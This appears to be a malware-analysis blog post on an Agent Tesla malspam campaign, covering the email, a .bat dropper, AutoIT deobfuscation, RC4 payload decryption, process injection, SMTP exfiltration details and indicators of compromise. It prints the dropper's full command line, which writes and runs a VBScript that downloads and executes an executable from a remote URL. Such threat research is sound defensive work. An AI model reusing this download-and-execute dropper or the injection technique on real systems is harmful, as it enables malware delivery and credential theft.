---
layout: post
title:  "[MALSPAM] Deep analysis of new Agent Tesla campaign with AutoIT dropper"
date:   2020-03-05
category: blog
---

we found a new, strange, malspam campaign with, as target, the sales office of an important company.
The email was the following:
<figure>
<img src="https://i.ibb.co/K0D7mkh/email.jpg" alt="malspam" style="width:60%">
<figcaption>Figure 1: Malspam email</figcaption>
</figure>

The attachment of this malspam email wasn't the usual Microsoft Office dropper with macros,  but a simple .bat dropper that did nothing but download and run the real AutoIT malware from this domain: **hxxp://www.bitsandbytes.net.in/bobbbb.exe**
- Hash:**2f850dfe603b274604a1c2db112eb7b2**
- Name:**STATMENT OF ACCOUNT.bat**
- Code:
> cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>%TEMP%poc.vbs&@echo objXMLHTTP.open "GET","http://www.bitsandbytes.net.in/bobbbb.exe",false>>%TEMP%poc.vbs&@echo objXMLHTTP.send()>>%TEMP%poc.vbs&@echo If objXMLHTTP.Status=200 Then>>%TEMP%poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>%TEMP%poc.vbs&@echo objADOStream.Open>>%TEMP%poc.vbs&@echo objADOStream.Type=1 >>%TEMP%poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>%TEMP%poc.vbs&@echo objADOStream.Position=0 >>%TEMP%poc.vbs&@echo objADOStream.SaveToFile "%TEMP%\LDTVF.exe">>%TEMP%poc.vbs&@echo objADOStream.Close>>%TEMP%poc.vbs&@echo Set objADOStream=Nothing>>%TEMP%poc.vbs&@echo End if>>%TEMP%poc.vbs&@echo Set objXMLHTTP=Nothing>>%TEMP%poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>%TEMP%poc.vbs&@echo objShell.Exec("%TEMP%\LDTVF.exe")>>%TEMP%poc.vbs&cscript.exe %TEMP%poc.vbs"

The downloaded **bobbbb.exe** is an AutoIT executable that contains an Agent Tesla payload.

## AutoIT Dropper Deobfuscation

AutoIT is a scripting language for Windows, really used to create malwares because of his high-level abstraction and his low rate of antivirus detection.
Fortunately, it's compilation process is easy to invert, with tools like [Exe2Aut](http://domoticx.com/autoit3-decompiler-exe2aut/), that returns an almost perfect AutoIT source code. However, the code is, really often, highly obfuscated, then difficult to understand.

As you can see in figure 3, all strings are encrypted by one or more levels of obfuscation. Fortunately all those decryption functions return a string, and since we can modify the source code, I modified those functions directly in the program to write to a file the result of the decryption. After that, with a simple python script a subsituted in the source code the decrypted strings to obtain something more readable. 

In Figure 2 you can see the main function of this executable:

<figure>
<a href="https://ibb.co/GM4HYkX"><img src="https://i.ibb.co/t2TLjcS/Screenshot-from-2020-03-04-14-34-39.png" alt="Main Function" style="width:100%"></a>
<figcaption>Figure 2: Main function deobfuscated</figcaption>
</figure>

The $payload variable contains the shellcode of Agent Tesla malware as reversed string ( it ends with "x0" ). This payload is decrypted and injected in the **RegAsm.exe** process. 

Next I will explain the details of this process.

### Extraction of payload

To extract the payload of Agent  Tesla, we have to analyze in detail what the program does with the $payload variable.
In Figure 3-4, you can see the AllocatePayload () function before and after the deobfuscation:

<figure>
<a href="https://ibb.co/g4qH4dB"><img src="https://i.ibb.co/6X9VX8f/obfuscated.png" alt="obfuscated" style="width:100%"></a>
 <figcaption>Figure 3: Obfuscated function</figcaption>
</figure>
<figure>
<a href="https://ibb.co/PNBQVnr"><img src="https://i.ibb.co/c1zLsHy/deobfuscated.png" alt="deobfuscated" style="width:100%"></a>
 <figcaption>Figure 4: Deobfuscated function</figcaption>
</figure>

In this function we can see another shellcode that I called $rc4decryptor. Indeed it's clear what the dropper does: 
- Allocate with VirtualAlloc a piece of memory of size len(\$rc4decryptor) + len(\$payload)
- Fill that piece of memory with "DllStructSetData"
- Call the $rc4decryptor shellcode with "DllCallAddress", to decode the payload with the second parameter of the function as key ("**LLWOMJRSUC**")
The result of this decryption is returned to the main function. To extract the payload then we can modify the source code with this line after the AllocatePayload function:

>   FileWrite ("decrypted_payload.bin", $decrypted_payload)

Otherwise we can put a breakpoint to the end of the RC4 decryption stub, and dump the decrypted memory (but after that you need to rebuild the corrupted PE Header).

The InjectToProcess() function (Figure 5) allocates memory for another strange shellcode, built, again, concatenating strings. Then calls that shellcode with RegAsm.exe and the decrypted payload of Agent Tesla as parameters.
That shellcode simply injects the payload in the process.

<figure>
<a href="https://ibb.co/BzFBvsz"><img src="https://i.ibb.co/yf7qKsf/Inject-Payload.png" alt="deobfuscated" style="width:100%"></a>
 <figcaption>Figure 5: Injection Function</figcaption>
</figure>

## Agent Tesla Payload

Agent Tesla is a .Net based malware that steals passwords, keystrokes and other sensible information, then sends it to a remote c&c server, through HTTP/SMTP protocols.
I will not go deep in this analysis, because a lot of articles have already analyzed this kind of malware.
Through a dynamic analysis, we can easily see that it try to access to all browser's files that stores passwords (Figure 6), and opens a TCP connection with this AWS c&c:

  >  ec2-54-204-24-179.compute-1.amazonaws[.]com

<figure>
<a href="https://ibb.co/L8ShtPS"><img src="https://i.ibb.co/1LZJqnZ/password-stealing.jpg" style="width:100%"></a>
 <figcaption>Figure 6: Dynamic Analysis</figcaption>
</figure>

### Strings decryption

Analyzing the extracted payload with [dnSPY](https://github.com/0xd4d/dnSpy), we can see another obfuscated code. 
What we want to retrieve are the SMTP credentials, that are hardcoded in the extracted payload (figure below). All strings are decrypted by ***Module.\u205f ()*** function.

<figure>
<a href="https://ibb.co/M7c0vfz"><img src="https://i.ibb.co/pdfF7QH/SMTP-credentials.png" style="width:100%"></a>
</figure>

In this function (last figure) the parameter A_0 is an integer that identify the string to decrypt. It is used only at line 18055, then I decided to put a breakpoint at line 18056 and modify manually the value of num3 variable in memory, setting the indexes corresponding to the SMTP credentials (this process, because unfortunately during debugging, I can't reach the SMTP stub....).

<figure>
<img src="https://i.ibb.co/t2ft7PC/String-decryption-in-payload.png" style="width:80%">
</figure>

> Username index: 602112 -> 0x00093000 -> contact@euramtec.pw

> Password index:   602240 -> 0x00093080 -> ******* 

> SMTP host index: 602368 -> 0x00093100 -> "us2.smtp.mailhostbox.com"

Then, this is how the emails  with stolen data arrive to the malware owner:

<figure>
<img src="https://i.ibb.co/K5C6FyR/stealing-IOC.jpg" style="width:100%">
</figure>


### Other useful resources

 - [Technical analysis of an old similar case](https://blog.talosintelligence.com/2019/11/custom-dropper-hide-and-seek.html)
  - [Technical analysis of Agent Tesla malware](https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html)

### IOC:

- Email attachment: 2f850dfe603b274604a1c2db112eb7b2
- AutoIT dropper: 3aff072f92c2577bbaa5bb96144ed72b
- Agent Tesla Payload: 1af5ec6d86ab3e66d13a2bb51cb52d43
- Servers:
	-  hxxp://www.bitsandbytes.net.in/bobbbb.exe
	-  54.204.24.179 (AWS C&C)
